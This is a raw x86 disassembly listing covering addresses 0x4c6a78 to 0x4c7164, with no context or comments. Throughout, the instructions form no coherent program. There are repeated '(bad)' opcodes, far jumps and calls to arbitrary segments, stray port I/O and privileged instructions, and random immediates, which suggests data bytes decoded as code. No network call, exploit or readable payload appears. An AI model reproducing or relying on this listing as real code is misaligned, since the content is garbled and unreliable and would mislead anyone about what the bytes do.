  4c6a78:	add    eax,0x4d8e8b6f
  4c6a7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c6a7e:	jae    0x4c6a5f
  4c6a80:	ror    DWORD PTR ds:0xe6a80ed,cl
  4c6a86:	push   0x68e3728f
  4c6a8b:	ret    
  4c6a8c:	shl    DWORD PTR [edi+0x65],0x1f
  4c6a90:	daa    
  4c6a91:	jmp    0x659f:0x1b655f27
  4c6a98:	inc    ebx
  4c6a99:	jo     0x4c6b0f
  4c6a9b:	mov    ah,0x23
  4c6a9d:	fcom   DWORD PTR [edi]
  4c6a9f:	xor    ebx,DWORD PTR [edi]
  4c6aa1:	mov    ds:0x524b46f,eax
  4c6aa6:	push   es
  4c6aa7:	sahf   
  4c6aa8:	gs jg  0x4c6a6b
  4c6aab:	ret    
  4c6aac:	sub    ecx,DWORD PTR [eax+0x56]
  4c6aaf:	push   ebp
  4c6ab0:	push   cs
  4c6ab1:	bound  ecx,QWORD PTR [ebx]
  4c6ab3:	ror    DWORD PTR [esi+0x64472182],1
  4c6ab9:	pop    ss
  4c6aba:	jae    0x4c6a47
  4c6abc:	fimul  DWORD PTR es:[edx]
  4c6abf:	jo     0x4c6ad5
  4c6ac1:	aas    
  4c6ac2:	push   ebx
  4c6ac3:	sbb    al,0xb4
  4c6ac5:	loopne 0x4c6ab0
  4c6ac7:	inc    eax
  4c6ac8:	jo     0x4c6a69
  4c6aca:	ja     0x4c6aa0
  4c6acc:	add    bl,BYTE PTR [ebp-0x7c]
  4c6acf:	dec    edi
  4c6ad0:	jb     0x4c6b02
  4c6ad2:	stos   BYTE PTR es:[edi],al
  4c6ad3:	pop    edx
  4c6ad4:	int    0x0
  4c6ad6:	xor    eax,DWORD PTR [edi+0x5b]
  4c6ad9:	xor    BYTE PTR [ebx],al
  4c6adb:	rcr    BYTE PTR [ebx-0x3a],1
  4c6ade:	or     eax,0xc3b45c3d
  4c6ae3:	daa    
  4c6ae4:	sbb    dl,BYTE PTR [edx+0x5c]
  4c6ae7:	inc    edi
  4c6ae8:	aaa    
  4c6ae9:	adc    eax,DWORD PTR [edi+0x5367166d]
  4c6aef:	test   DWORD PTR [esi-0x2890a2ea],0x22d2cfb3
  4c6af9:	and    BYTE PTR [eax-0x6089d8e1],ah
  4c6aff:	mov    esi,0x62414eb9
  4c6b04:	xlat   BYTE PTR ds:[ebx]
  4c6b06:	addr16 (bad) 
  4c6b08:	and    BYTE PTR [edx+0x6f136fa2],bh
  4c6b0e:	jae    0x4c6b84
  4c6b10:	or     esp,DWORD PTR [ebp+0x6a]
  4c6b13:	jne    0x4c6b31
  4c6b15:	lods   al,BYTE PTR ds:[esi]
  4c6b16:	fistp  QWORD PTR [edi+0x77]
  4c6b19:	add    eax,0x62c1ec17
  4c6b1e:	pop    ebx
  4c6b1f:	cmp    esi,DWORD PTR gs:[eax-0x1]
  4c6b23:	(bad)  
  4c6b25:	mov    ebp,0x29168fa3
  4c6b2a:	cli    
  4c6b2b:	xor    DWORD PTR [edx+0xe3a66fe],eax
  4c6b31:	sub    al,0x88
  4c6b33:	sbb    edx,DWORD PTR [ebx]
  4c6b35:	outs   dx,BYTE PTR ds:[esi]
  4c6b36:	pop    ebx
  4c6b37:	loope  0x4c6b6d
  4c6b39:	cmp    DWORD PTR [esi+0x6e174f20],edx
  4c6b3f:	call   0x872b:0x45c1d8a5
  4c6b46:	mov    DWORD PTR [ebp+0x6d],0xd37d88c3
  4c6b4d:	gs iret 
  4c6b4f:	jae    0x4c6b24
  4c6b51:	push   ebp
  4c6b52:	xor    al,dl
  4c6b54:	push   es
  4c6b55:	(bad)  
  4c6b56:	xor    dl,BYTE PTR [ebx]
  4c6b58:	fnop   
  4c6b5a:	push   esp
  4c6b5b:	ins    DWORD PTR es:[edi],dx
  4c6b5c:	retf   
  4c6b5d:	aaa    
  4c6b5e:	adc    eax,0xe25b1c5c
  4c6b63:	jae    0x4c6bd3
  4c6b65:	mov    ds:0x75b143b7,eax
  4c6b6a:	or     eax,0x33dfef73
  4c6b6f:	mov    cl,BYTE PTR [edx+0x57327bc7]
  4c6b75:	pop    ebx
  4c6b76:	ds inc edi
  4c6b78:	mov    ch,0x21
  4c6b7a:	mov    dh,0xe3
  4c6b7c:	push   edi
  4c6b7d:	ja     0x4c6b4e
  4c6b7f:	xor    al,0x47
  4c6b81:	push   eax
  4c6b82:	inc    ecx
  4c6b83:	mov    al,ds:0x52577786
  4c6b88:	adc    eax,0x25d2b501
  4c6b8d:	mov    ds:0x98a559b0,eax
  4c6b92:	jg     0x4c6bf7
  4c6b94:	mov    ebx,0x3b7bbf4c
  4c6b99:	arpl   WORD PTR [ebx+0x5a],di
  4c6b9c:	xchg   esi,eax
  4c6b9d:	pop    eax
  4c6b9e:	add    BYTE PTR [ecx-0x4d],al
  4c6ba1:	sub    BYTE PTR [ebx+0x1a],0x56
  4c6ba5:	das    
  4c6ba6:	imul   esp,DWORD PTR [ebx],0xb0ae8691
  4c6bac:	push   ds
  4c6bad:	(bad)  
  4c6baf:	push   0xffffffee
  4c6bb1:	lods   eax,DWORD PTR ds:[esi]
  4c6bb2:	pop    es
  4c6bb3:	jnp    0x4c6c24
  4c6bb5:	aaa    
  4c6bb6:	and    eax,DWORD PTR [ecx+0x69e0bae3]
  4c6bbc:	mov    bl,0x73
  4c6bbe:	dec    edi
  4c6bbf:	jb     0x4c6bc1
  4c6bc1:	and    DWORD PTR ds:0x5b6583cd,ecx
  4c6bc7:	or     al,0xb0
  4c6bc9:	inc    ebp
  4c6bca:	shr    DWORD PTR [ecx],0x63
  4c6bcd:	retf   
  4c6bce:	(bad)  
  4c6bcf:	(bad)  
  4c6bd0:	add    BYTE PTR [ecx+0x531fa30e],al
  4c6bd6:	imul   ebp,edi,0x22
  4c6bd9:	xor    eax,0x66fa7ac
  4c6bde:	sub    eax,0x5068a4a
  4c6be3:	pop    es
  4c6be4:	(bad)  
  4c6be5:	es or  edx,esi
  4c6be8:	push   esi
  4c6be9:	ret    
  4c6bea:	xor    eax,edi
  4c6bec:	das    
  4c6bed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4c6bee:	add    ebp,DWORD PTR [ecx+0x30f2df00]
  4c6bf4:	add    eax,0x93843012
  4c6bf9:	pop    ss
  4c6bfa:	and    ecx,DWORD PTR [esi-0x2cdde3f9]
  4c6c00:	mov    ds:0xbc301856,eax
  4c6c05:	dec    esi
  4c6c06:	add    ch,BYTE PTR [edi-0x65]
  4c6c09:	mov    cs,WORD PTR [ebp+0x4b]
  4c6c0c:	rcl    DWORD PTR ds:0x2c9b4347,0xb1
  4c6c13:	or     eax,0x4c1bf410
  4c6c18:	dec    ebx
  4c6c19:	and    eax,DWORD PTR [ecx]
  4c6c1b:	or     eax,0x1647dda4
  4c6c20:	bound  ebp,QWORD PTR es:[eax+0x33]
  4c6c24:	pop    eax
  4c6c25:	xchg   ebx,eax
  4c6c26:	(bad)  
  4c6c27:	seta   BYTE PTR [eax]
  4c6c2a:	adc    DWORD PTR [edx+edx*1],ecx
  4c6c2d:	iret   
  4c6c2e:	sub    bh,BYTE PTR [ebx]
  4c6c30:	xchg   BYTE PTR [edx],cl
  4c6c32:	inc    ebx
  4c6c33:	sub    bh,dh
  4c6c35:	inc    ebp
  4c6c36:	pop    ss
  4c6c37:	popa   
  4c6c38:	push   0x77fb8544
  4c6c3d:	cmp    eax,0xb6090f06
  4c6c42:	call   0x26a8:0x68c32b09
  4c6c49:	mov    al,ds:0xe86b072a
  4c6c4e:	shr    BYTE PTR [edx-0x5d7468f4],0x51
  4c6c55:	rcl    BYTE PTR [eax+0x3b],cl
  4c6c58:	out    dx,eax
  4c6c59:	nop
  4c6c5a:	push   cs
  4c6c5b:	sub    al,0xde
  4c6c5d:	xor    eax,DWORD PTR [esi+0x33]
  4c6c60:	ret    
  4c6c61:	xor    esi,DWORD PTR [eax-0x54]
  4c6c64:	add    cl,BYTE PTR [ebx+0x6d]
  4c6c67:	js     0x4c6cd8
  4c6c69:	sub    al,0x9d
  4c6c6c:	shr    DWORD PTR [ebx-0x7a],cl
  4c6c6f:	push   ss
  4c6c70:	jp     0x4c6c39
  4c6c72:	aam    0x81
  4c6c74:	adc    eax,0xabc72be2
  4c6c79:	rol    BYTE PTR [ebp+0x4b],cl
  4c6c7c:	dec    ebx
  4c6c7d:	(bad)  
  4c6c7e:	scas   al,BYTE PTR es:[edi]
  4c6c7f:	sbb    BYTE PTR [edx+0x75],dh
  4c6c82:	inc    ecx
  4c6c83:	lea    edx,[ebp+0x1a]
  4c6c86:	mov    bh,0x83
  4c6c88:	adc    ah,dh
  4c6c8a:	scas   al,BYTE PTR es:[edi]
  4c6c8b:	xor    BYTE PTR [esi-0x59],ch
  4c6c8e:	bound  edx,QWORD PTR [esi]
  4c6c90:	leave  
  4c6c91:	inc    esp
  4c6c92:	dec    ebx
  4c6c93:	push   esp
  4c6c94:	xchg   ebx,eax
  4c6c95:	pop    ebx
  4c6c96:	push   cs
  4c6c97:	adc    bh,BYTE PTR [edx+0x34]
  4c6c9a:	sbb    BYTE PTR [esi],ch
  4c6c9c:	dec    ebx
  4c6c9d:	outs   dx,DWORD PTR ds:[esi]
  4c6c9e:	stos   BYTE PTR es:[edi],al
  4c6c9f:	or     al,0x69
  4c6ca1:	and    edx,DWORD PTR cs:[ebp-0xd]
  4c6ca5:	aaa    
  4c6ca6:	pop    esp
  4c6ca7:	popa   
  4c6ca8:	xchg   ebp,eax
  4c6ca9:	rcl    BYTE PTR [ebx+0x7b],cl
  4c6cac:	jae    0x4c6ccb
  4c6cae:	shl    DWORD PTR [edi+0xd],0xaf
  4c6cb2:	jb     0x4c6c8f
  4c6cb4:	outs   dx,BYTE PTR ds:[esi]
  4c6cb5:	stos   DWORD PTR es:[edi],eax
  4c6cb6:	jo     0x4c6d2e
  4c6cb8:	lea    ecx,[ecx]
  4c6cba:	icebp  
  4c6cbb:	xchg   edi,eax
  4c6cbc:	arpl   di,dx
  4c6cbe:	gs pop es
  4c6cc0:	stos   DWORD PTR es:[edi],eax
  4c6cc1:	fldcw  WORD PTR [eax+0x17]
  4c6cc4:	and    DWORD PTR [edi+0x73],0x4b
  4c6cc8:	inc    esi
  4c6cc9:	lds    esp,FWORD PTR ds:0xffb7ca16
  4c6ccf:	(bad)  
  4c6cd0:	mov    cl,0x86
  4c6cd2:	xchg   DWORD PTR [esi-0x25],edi
  4c6cd5:	mov    ds:0x3368ac1c,eax
  4c6cda:	pop    edi
  4c6cdb:	fwait
  4c6cdc:	out    dx,al
  4c6cdd:	sub    al,BYTE PTR [ebp-0x55]
  4c6ce0:	rcl    BYTE PTR [ecx-0x4ed48091],1
  4c6ce6:	sbb    dh,BYTE PTR [ecx-0x80]
  4c6ce9:	or     ebp,DWORD PTR [ebx-0x1a]
  4c6cec:	mov    eax,0xbfc37477
  4c6cf1:	bound  esp,QWORD PTR [esi+0x6]
  4c6cf4:	or     esp,DWORD PTR [esi]
  4c6cf6:	loopne 0x4c6d31
  4c6cf8:	or     eax,0x8fb3af08
  4c6cfd:	or     al,0xef
  4c6cff:	jbe    0x4c6cb1
  4c6d01:	mov    bl,0x37
  4c6d03:	(bad)  
  4c6d04:	outs   dx,BYTE PTR ds:[esi]
  4c6d05:	mov    ds:0xf561ba8b,eax
  4c6d0a:	mov    DWORD PTR [edi+0x2c2f4b9a],ebp
  4c6d10:	push   eax
  4c6d11:	(bad)  
  4c6d12:	stos   BYTE PTR es:[edi],al
  4c6d13:	pop    es
  4c6d14:	scas   eax,DWORD PTR es:[edi]
  4c6d15:	xchg   edi,eax
  4c6d16:	push   ebp
  4c6d17:	sub    ebp,DWORD PTR [ecx]
  4c6d19:	dec    eax
  4c6d1a:	pop    edx
  4c6d1b:	dec    eax
  4c6d1c:	aaa    
  4c6d1d:	adc    eax,0x6f8ec23c
  4c6d22:	stos   DWORD PTR es:[edi],eax
  4c6d23:	sub    al,0x73
  4c6d25:	lods   eax,DWORD PTR ds:[esi]
  4c6d26:	push   cs
  4c6d27:	test   BYTE PTR [esi+0x342aa327],ah
  4c6d2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4c6d2e:	test   eax,0x62b37383
  4c6d33:	pop    esp
  4c6d34:	push   edi
  4c6d35:	ror    DWORD PTR [ebx-0x11ea44b5],cl
  4c6d3b:	add    bh,bl
  4c6d3d:	adc    dh,BYTE PTR [edi+0x43a25765]
  4c6d43:	pusha  
  4c6d44:	push   es
  4c6d45:	or     al,0x1
  4c6d47:	sub    al,0x1f
  4c6d49:	outs   dx,DWORD PTR ds:[esi]
  4c6d4a:	add    eax,0xa71077d7
  4c6d4f:	inc    esi
  4c6d50:	adc    esp,DWORD PTR [edx]
  4c6d52:	fisttp DWORD PTR [ebp+ebp*1-0x4ce536e8]
  4c6d59:	adc    ebx,DWORD PTR [edx]
  4c6d5b:	mov    al,0x6
  4c6d5d:	pop    esp
  4c6d5e:	fwait
  4c6d5f:	sti    
  4c6d60:	or     ch,BYTE PTR [edx]
  4c6d62:	shr    DWORD PTR [edx+0x57674ac0],1
  4c6d68:	inc    esp
  4c6d69:	xor    eax,0x72b3607e
  4c6d6e:	adc    ebx,DWORD PTR [eax+0x31c163a2]
  4c6d74:	jnp    0x4c6d91
  4c6d76:	push   ebp
  4c6d77:	mov    ch,0x40
  4c6d79:	daa    
  4c6d7a:	outs   dx,BYTE PTR ds:[esi]
  4c6d7b:	mov    edi,0x144baf6c
  4c6d80:	ror    DWORD PTR [edx+0x4f53f386],0x5a
  4c6d87:	xor    al,0xb4
  4c6d89:	retf   0xef23
  4c6d8c:	(bad)  
  4c6d8d:	mov    ds:0x170ba8c1,eax
  4c6d92:	pop    ebx
  4c6d93:	dec    esi
  4c6d94:	cmp    al,BYTE PTR [esi]
  4c6d96:	adc    eax,0x7577b7c
  4c6d9b:	shl    DWORD PTR [ebp-0x70b1d962],1
  4c6da1:	inc    ebx
  4c6da2:	daa    
  4c6da3:	xchg   ebx,eax
  4c6da4:	push   ss
  4c6da5:	adc    DWORD PTR ds:0x59eb5b2f,ecx
  4c6dab:	mov    esp,ebx
  4c6dad:	pusha  
  4c6dae:	xchg   edi,eax
  4c6daf:	lahf   
  4c6db0:	in     al,dx
  4c6db1:	call   0x438572c
  4c6db6:	sub    esp,DWORD PTR [ebp+0x5f]
  4c6db9:	mov    ch,0xa2
  4c6dbb:	movlps QWORD PTR [edi],xmm5
  4c6dbe:	das    
  4c6dbf:	xchg   edi,eax
  4c6dc0:	das    
  4c6dc1:	xchg   edi,eax
  4c6dc2:	mov    ecx,0xdab3cb8e
  4c6dc8:	sub    edi,DWORD PTR [edi+0x2f]
  4c6dcb:	push   ebp
  4c6dcc:	mov    ds:0x3a874561,al
  4c6dd1:	or     al,0x55
  4c6dd3:	mov    al,ds:0xa361404b
  4c6dd8:	push   ebx
  4c6dd9:	mov    ds:0x570a403a,eax
  4c6dde:	lsl    esp,ax
  4c6de1:	mov    al,ah
  4c6de3:	mov    dh,0x53
  4c6de5:	ja     0x4c6e3d
  4c6de7:	add    edi,DWORD PTR [edx]
  4c6de9:	add    al,BYTE PTR [edx-0x7868ea4b]
  4c6def:	pop    ss
  4c6df0:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4c6df2:	or     DWORD PTR [esi],esi
  4c6df4:	jmp    0x4c6e45
  4c6df6:	repz lock mov esi,0x2373ab55
  4c6dfd:	imul   esi,DWORD PTR [esi+0x7b],0x3a
  4c6e01:	push   ebx
  4c6e02:	test   DWORD PTR [edx],ecx
  4c6e04:	mov    bh,0xf3
  4c6e06:	sub    eax,0xcd60953f
  4c6e0b:	adc    edi,DWORD PTR [edi]
  4c6e0d:	out    0x71,eax
  4c6e0f:	xchg   edi,eax
  4c6e10:	push   esi
  4c6e11:	pusha  
  4c6e12:	jo     0x4c6e42
  4c6e14:	push   esi
  4c6e15:	pop    es
  4c6e16:	aaa    
  4c6e17:	inc    esp
  4c6e18:	add    BYTE PTR [esp+edx*8-0x2d],ch
  4c6e1c:	dec    ebx
  4c6e1d:	push   ds
  4c6e1e:	js     0x4c6df1
  4c6e20:	fisubr WORD PTR [edi+0x2f]
  4c6e23:	ds data16 sti 
  4c6e26:	ja     0x4c6e12
  4c6e28:	call   0x6b6d:0x7786d889
  4c6e2f:	push   cs
  4c6e30:	push   edx
  4c6e31:	popa   
  4c6e32:	and    DWORD PTR [edi+0x3b],ecx
  4c6e35:	jecxz  0x4c6e5b
  4c6e37:	push   0x6af7bab0
  4c6e3c:	ss inc edx
  4c6e3e:	fimul  WORD PTR [edx+0x4f349af3]
  4c6e44:	cmp    BYTE PTR [eax+0xb],dh
  4c6e47:	mov    dh,0x93
  4c6e49:	retf   
  4c6e4a:	sbb    edx,0xffffff81
  4c6e4d:	fidivr WORD PTR [edx]
  4c6e4f:	jg     0x4c6e67
  4c6e51:	jae    0x4c6eae
  4c6e53:	and    esp,eax
  4c6e55:	test   eax,0x6f1dd2b7
  4c6e5a:	mov    eax,ds:0x63941045
  4c6e5f:	shl    edx,cl
  4c6e61:	adc    cl,ch
  4c6e63:	aad    0x4b
  4c6e65:	add    BYTE PTR [ebx+eax*4-0x4d],dl
  4c6e69:	push   esi
  4c6e6a:	xor    BYTE PTR [ebp-0x9],dl
  4c6e6d:	arpl   WORD PTR [ebx+0x718e4dc7],ax
  4c6e73:	inc    edi
  4c6e74:	popa   
  4c6e75:	(bad)  
  4c6e76:	sub    dh,BYTE PTR [edx+0x8]
  4c6e79:	push   0xaf93eeb4
  4c6e7e:	and    dl,BYTE PTR [edi-0x50e2a96e]
  4c6e84:	outs   dx,DWORD PTR ds:[esi]
  4c6e85:	ds push ebx
  4c6e87:	or     eax,0xff41ac6a
  4c6e8c:	imul   DWORD PTR [edx+0x3a]
  4c6e8f:	or     dl,BYTE PTR [ecx]
  4c6e91:	repz cmps DWORD PTR ds:[si],DWORD PTR es:[di]
  4c6e94:	sub    esp,DWORD PTR [esi]
  4c6e96:	cmp    eax,0x7c5fb631
  4c6e9b:	lods   al,BYTE PTR ds:[esi]
  4c6e9c:	cmp    bh,BYTE PTR [eax-0x1d]
  4c6e9f:	mov    ebx,0xd163fcb
  4c6ea4:	add    edx,DWORD PTR [eax]
  4c6ea6:	mov    bl,0x20
  4c6ea8:	call   FWORD PTR [eax+0x5f175820]
  4c6eae:	xor    esp,DWORD PTR [edx]
  4c6eb0:	add    BYTE PTR [ebx+0x7f57e2c6],ch
  4c6eb6:	(bad)  
  4c6eb7:	dec    edx
  4c6eb8:	sbb    al,0xb0
  4c6eba:	mov    edi,0x74727b2a
  4c6ebf:	mov    al,0xed
  4c6ec1:	xchg   DWORD PTR [edi+0x752e7e7b],edx
  4c6ec7:	lds    ebp,FWORD PTR [esi+0x51]
  4c6eca:	ss mov ebx,0x36820939
  4c6ed0:	pusha  
  4c6ed1:	jle    0x4c6eb6
  4c6ed3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4c6ed4:	or     DWORD PTR [edx+0x7f2d4bae],eax
  4c6eda:	add    BYTE PTR [edi+0x7],cl
  4c6edd:	stos   DWORD PTR es:[edi],eax
  4c6ede:	stos   DWORD PTR es:[edi],eax
  4c6edf:	ja     0x4c6ea4
  4c6ee1:	in     al,dx
  4c6ee2:	sbb    al,BYTE PTR [esi+0x57ab3354]
  4c6ee8:	mov    bl,0x28
  4c6eea:	jecxz  0x4c6ef8
  4c6eec:	push   ecx
  4c6eed:	arpl   WORD PTR [esi-0x44],si
  4c6ef0:	mov    ebx,0xf37ba8b0
  4c6ef5:	imul   ebp,DWORD PTR [edx],0x2238c74
  4c6efb:	xchg   esi,eax
  4c6efc:	mov    ds:0xa96b0022,eax
  4c6f01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4c6f02:	sar    DWORD PTR [edi],cl
  4c6f04:	sub    cl,BYTE PTR [esi+0x77df5560]
  4c6f0a:	jae    0x4c6ef3
  4c6f0c:	in     al,0xfa
  4c6f0e:	pop    edx
  4c6f0f:	xlat   BYTE PTR ds:[ebx]
  4c6f10:	(bad)  
  4c6f11:	jmp    0x4c6e9e
  4c6f13:	fstp   QWORD PTR ds:0x9b6b6ec0
  4c6f19:	push   ebp
  4c6f1a:	data16 jo 0x4c6f2e
  4c6f1d:	pop    esp
  4c6f1e:	rcl    DWORD PTR [esi+0x43],0x2a
  4c6f22:	aaa    
  4c6f23:	sub    ch,BYTE PTR [edx]
  4c6f25:	add    ch,BYTE PTR [esi+0x44]
  4c6f28:	sub    esi,DWORD PTR [edx]
  4c6f2a:	inc    edi
  4c6f2b:	adc    BYTE PTR [esi-0x7d],0x61
  4c6f2f:	sub    eax,0x750ef6af
  4c6f34:	mov    eax,ds:0xbb8e1b42
  4c6f39:	cmp    BYTE PTR [edx-0x6c4cee9f],al
  4c6f3f:	sub    ecx,ebp
  4c6f41:	stos   BYTE PTR es:[edi],al
  4c6f42:	fld    QWORD PTR [esi+0x2a]
  4c6f45:	(bad)  [ebx+eiz*2+0x73]
  4c6f49:	test   al,0x98
  4c6f4b:	or     BYTE PTR [ecx],al
  4c6f4d:	repz je 0x4c6ee3
  4c6f50:	loop   0x4c6ed6
  4c6f52:	mov    al,ds:0xf40f6ad1
  4c6f57:	sbb    DWORD PTR [ecx-0x5a],ecx
  4c6f5a:	and    bh,BYTE PTR [ebx+0x31]
  4c6f5d:	adc    cl,BYTE PTR [ebx-0x204827da]
  4c6f63:	jno    0x4c6f34
  4c6f65:	mov    esi,DWORD PTR [eax+0x7bcf8c4a]
  4c6f6b:	adc    eax,DWORD PTR [edi]
  4c6f6d:	(bad)  
  4c6f6e:	scas   al,BYTE PTR es:[edi]
  4c6f6f:	inc    ebx
  4c6f70:	jmp    0x4c6fe1
  4c6f72:	lahf   
  4c6f73:	sbb    DWORD PTR [eax+esi*2+0x5],0x1c
  4c6f78:	data16 aas 
  4c6f7a:	push   ebx
  4c6f7b:	cmp    BYTE PTR [ecx+ebx*1],dl
  4c6f7e:	rcl    BYTE PTR [ebp+0x7448cf61],1
  4c6f84:	dec    ecx
  4c6f85:	shl    BYTE PTR [ebx-0x55],cl
  4c6f88:	jmp    0x4c6f5e
  4c6f8a:	mov    BYTE PTR [edx],al
  4c6f8c:	mov    bl,0xaf
  4c6f8e:	add    bh,dl
  4c6f90:	and    eax,0x4326349
  4c6f95:	push   esi
  4c6f96:	test   al,0x54
  4c6f98:	retf   
  4c6f99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c6f9a:	and    al,0xad
  4c6f9c:	add    DWORD PTR [ebx],esp
  4c6f9e:	arpl   WORD PTR [ebx-0x68fa49f6],bp
  4c6fa4:	outs   dx,DWORD PTR ds:[esi]
  4c6fa5:	out    dx,eax
  4c6fa6:	fcomi  st,st(0)
  4c6fa8:	loope  0x4c6f5b
  4c6faa:	jmp    0x841:0x772ac36d
  4c6fb1:	mov    cl,0x50
  4c6fb3:	pop    es
  4c6fb4:	inc    edi
  4c6fb5:	jecxz  0x4c6fa4
  4c6fb7:	call   0xab1d:0xc78f176a
  4c6fbe:	or     eax,0x7fb1582b
  4c6fc3:	dec    edi
  4c6fc4:	out    dx,eax
  4c6fc5:	fwait
  4c6fc6:	or     BYTE PTR [ebp+eiz*4+0x35766bae],ah
  4c6fcd:	test   al,0xc4
  4c6fcf:	jmp    0xa230:0x3f8333d0
  4c6fd6:	(bad)  
  4c6fd7:	mov    bl,0xbf
  4c6fd9:	dec    eax
  4c6fda:	add    eax,0xdf6380c8
  4c6fdf:	jo     0x4c6f68
  4c6fe1:	xchg   edi,eax
  4c6fe2:	aad    0xb4
  4c6fe4:	adc    ebx,DWORD PTR [eax-0x39]
  4c6fe7:	mov    edi,0x89d61760
  4c6fec:	stos   DWORD PTR es:[edi],eax
  4c6fed:	sub    DWORD PTR [ecx-0x30d552ec],0xf
  4c6ff4:	or     eax,0x8b560757
  4c6ff9:	aaa    
  4c6ffa:	sub    al,BYTE PTR [ebx]
  4c6ffc:	and    dl,al
  4c6ffe:	stos   BYTE PTR es:[edi],al
  4c6fff:	sbb    bl,dl
  4c7001:	lahf   
  4c7002:	add    al,BYTE PTR [ebx]
  4c7004:	xchg   edi,eax
  4c7005:	push   ss
  4c7006:	iret   
  4c7007:	psadbw mm6,mm0
  4c700a:	push   esi
  4c700b:	rcl    BYTE PTR [esi+ecx*2],cl
  4c700e:	data16 and al,0x5a
  4c7011:	popa   
  4c7012:	shr    DWORD PTR [edx],0x1e
  4c7015:	push   esi
  4c7016:	jae    0x4c706f
  4c7018:	scas   eax,DWORD PTR es:[edi]
  4c7019:	xchg   edi,eax
  4c701a:	popf   
  4c701b:	pop    eax
  4c701c:	daa    
  4c701d:	push   esi
  4c701e:	adc    ebp,DWORD PTR [edi+0x27]
  4c7021:	adc    dh,BYTE PTR [ebp+0x62]
  4c7024:	adc    edi,edi
  4c7026:	lods   al,BYTE PTR cs:[esi]
  4c7028:	ficom  DWORD PTR [ecx+0x3e]
  4c702b:	dec    edi
  4c702c:	jb     0x83f7db3d
  4c7032:	pmullw mm1,QWORD PTR [eax+0x4d]
  4c7036:	call   0x756a:0x5d1f3b48
  4c703d:	push   eax
  4c703e:	push   cs
  4c703f:	mov    gs,WORD PTR [ebx+0x67a092ab]
  4c7045:	mov    bl,0x97
  4c7047:	and    eax,0x21a380e9
  4c704c:	scas   al,BYTE PTR es:[edi]
  4c704d:	sbb    al,0x6a
  4c704f:	bound  eax,QWORD PTR [edx+0x772f3b58]
  4c7055:	das    
  4c7056:	sub    BYTE PTR [ecx+ebp*8],dh
  4c7059:	cmp    BYTE PTR [edi-0x76711ccc],0x92
  4c7060:	ss test ebx,0xcc015628
  4c7067:	ds xchg ebx,edi
  4c706a:	jbe    0x4c7093
  4c706c:	pop    ebx
  4c706d:	mov    ds:0xdfd33342,eax
  4c7072:	mov    ds:0x8ec09f68,al
  4c7077:	retf   
  4c7078:	pop    ss
  4c7079:	add    DWORD PTR ds:0x151a8d58,ebp
  4c707f:	inc    ebx
  4c7080:	pop    edi
  4c7081:	push   0x7fcb75d4
  4c7086:	ja     0x4c70a7
  4c7088:	fwait
  4c7089:	dec    ebx
  4c708a:	nop
  4c708b:	push   ds
  4c708c:	xchg   ebp,eax
  4c708d:	adc    DWORD PTR [esp+esi*1],0xffffffc0
  4c7091:	sbb    bl,0x5e
  4c7094:	pop    esi
  4c7095:	stos   DWORD PTR es:[edi],eax
  4c7096:	arpl   WORD PTR ds:0xdff37beb,ax
  4c709c:	jmp    0x32e2:0x1f6fb581
  4c70a3:	ja     0x4c70c6
  4c70a5:	push   edx
  4c70a6:	push   ebp
  4c70a7:	mov    ds:0x11439312,al
  4c70ac:	xor    BYTE PTR [ecx-0x15],dl
  4c70af:	inc    edx
  4c70b0:	xlat   BYTE PTR ds:[ebx]
  4c70b1:	sub    ah,BYTE PTR [edi-0x75]
  4c70b4:	xchg   edx,eax
  4c70b5:	adc    BYTE PTR [edx-0x1],0x8c
  4c70b9:	inc    esp
  4c70ba:	sub    BYTE PTR [ecx-0x2d],al
  4c70bd:	inc    esp
  4c70be:	jmp    0x2b8f:0x729ed25a
  4c70c5:	push   eax
  4c70c6:	add    BYTE PTR [ebx+eiz*2-0x80],cl
  4c70ca:	pusha  
  4c70cb:	add    DWORD PTR [eax-0x4936f8c7],ecx
  4c70d1:	ss daa 
  4c70d3:	call   0xfa5dc8d9
  4c70d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4c70d9:	and    eax,0x6548eabd
  4c70de:	popa   
  4c70df:	jo     0x4c70dc
  4c70e1:	add    DWORD PTR [ebx+0x6c],edx
  4c70e4:	adc    BYTE PTR [edx+eax*1+0x1b],ah
  4c70e8:	retf   0x7d0c
  4c70eb:	rcl    al,1
  4c70ed:	fst    QWORD PTR [ebx+eax*2+0x75]
  4c70f1:	jb     0x4c711f
  4c70f3:	push   esp
  4c70f4:	std    
  4c70f5:	mov    dh,0x33
  4c70f7:	and    al,0xa5
  4c70f9:	dec    ecx
  4c70fa:	fs es push edx
  4c70fd:	popa   
  4c70fe:	imul   esi,DWORD PTR [ebx+0x65],0xa50ff745
  4c7105:	and    eax,0x754d0107
  4c710a:	ins    BYTE PTR es:[edi],dx
  4c710b:	inc    esp
  4c710c:	imul   esi,DWORD PTR [esi+0x57],0xd0d05daf
  4c7113:	push   esi
  4c7114:	mov    ebp,0x661d5738
  4c7119:	push   ebx
  4c711a:	pusha  
  4c711b:	dec    eax
  4c711c:	test   DWORD PTR [ecx],0x2e6b140a
  4c7122:	sbb    bh,BYTE PTR [edx+0x14b0b472]
  4c7128:	arpl   WORD PTR [esi+0x5d83c87e],dx
  4c712e:	ins    DWORD PTR es:[edi],dx
  4c712f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c7130:	sub    eax,DWORD PTR [ebp+eiz*2+0x57]
  4c7134:	imul   esp,DWORD PTR [ebp+eiz*2-0x4a],0x4c9040bb
  4c713c:	jb     0x4c7192
  4c713e:	outs   dx,DWORD PTR ds:[esi]
  4c713f:	mov    dh,0xc8
  4c7141:	inc    edx
  4c7142:	jns    0x4c717a
  4c7144:	jbe    0x4c71b5
  4c7146:	int    0x48
  4c7148:	sub    BYTE PTR [esi+edx*4+0x72],ch
  4c714c:	arpl   WORD PTR [eax+0x79],si
  4c714f:	mov    dl,0x29
  4c7151:	ds rcl dh,1
  4c7154:	popaw  
  4c7156:	push   ebx
  4c7157:	cmp    eax,0x51577a6c
  4c715c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4c715d:	mov    al,ds:0x149ed073
  4c7162:	xchg   edx,eax
  4c7163:	ins    DWORD PTR es:[edi],dx
  4c7164:	pop    edi
